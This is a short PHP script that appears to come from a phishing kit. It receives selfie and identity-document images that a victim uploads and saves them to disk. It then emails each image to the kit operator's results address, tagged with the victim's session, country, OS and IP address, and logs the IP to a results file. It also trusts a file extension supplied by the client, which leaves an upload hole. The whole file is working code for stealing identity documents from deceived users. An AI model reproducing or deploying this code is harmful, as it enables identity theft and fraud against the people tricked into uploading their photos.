<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';

if(isset($_POST['id_slf'])&&isset($_POST['images'])){
	function upImg($vl){
		$t=microtime(true);
		$micro=sprintf("%06d",($t - floor($t))* 1000000);
		$today=date("m.d.y.h.i.s.U".$micro,$t);
		$name=hash('md5',$today);
		$type=explode(';',$vl)[0];
		$type='.'.explode('/',$type)[1];
		$base=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'./../../../proof/';
		file_put_contents('../pap/'.$name.$type,base64_decode(explode(',',$vl)[1]));
		return "../pap/".$name.$type;
	}
	$from = $_SESSION['from'];
	$type = $_POST['doc_type'];
    $subject = "SELFIE: $from - $type [ $cn - $os - $ip ]";

	for($i=0;$i<count($_POST['images']);$i++){
		kirim_foto($setting['email_result'], $from, $subject, upImg($_POST['images'][$i]));
	}
	tulis_file("../result/total_upload.txt", $ip);
	exit("done");
}